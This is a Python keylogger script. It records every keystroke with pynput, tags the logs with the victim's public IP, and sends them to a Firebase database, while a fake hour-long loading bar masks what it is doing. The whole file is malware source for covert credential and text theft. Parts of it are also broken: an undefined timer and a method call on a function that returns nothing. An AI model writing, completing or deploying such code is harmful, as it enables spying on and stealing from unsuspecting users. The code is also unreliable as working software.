import pynput.keyboard
import threading
import firebase_admin
from firebase_admin import credentials, db
import requests
import time
import sys
from itertools import cycle

def loading_screen(duration_in_seconds=3600):
    
    spinner = cycle(["|", "/", "-", "\\"]) 
    progress_bar_length = 50
    start_time = time.time()
    end_time = start_time + duration_in_seconds

    while time.time() < end_time:
        elapsed_time = time.time() - start_time
        progress = elapsed_time / duration_in_seconds
        bar = "#" * int(progress * progress_bar_length)
        spaces = " " * (progress_bar_length - len(bar))
        spinner_char = next(spinner)

        # Print the loading screen
        sys.stdout.write(
            f"\r[{bar}{spaces}] {int(progress * 100)}% {spinner_char}"
        )
        sys.stdout.flush()
        time.sleep(0.1)  

    print("\nLoading complete!")


cred = credentials.Certificate(' #') # your json file 
firebase_admin.initialize_app(cred, {
    'databaseURL': ' ' # database url
})


log = ""

def ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        response.raise_for_status()
        ip = response.json().get('ip', 'unknown_ip')
        return ip.replace('.', '-') 
    except Exception as e:
        return 'unknown_ip'

user_ip = ip() 

def process_key_press(key):
   
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{str(key)}] "

def firebase(log_data):
   
    try:
        ref = db.reference(f'key_logs/{user_ip}') 
        ref.push({'log': log_data})
        
    except Exception as e:
        pass
        print(f"Failed to download: {e}")
        print("RESTARTING")

def report():
   
    global log
    if log:
        firebase(log)
        log = ""  # Reset the log after sending
    
    timer.start()

def start():
    """Starts the keylogger."""
    #print(f"{user_ip}. start")
    keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
    with keyboard_listener:
        report()
        keyboard_listener.join()
loading_screen(3600).start()
start()

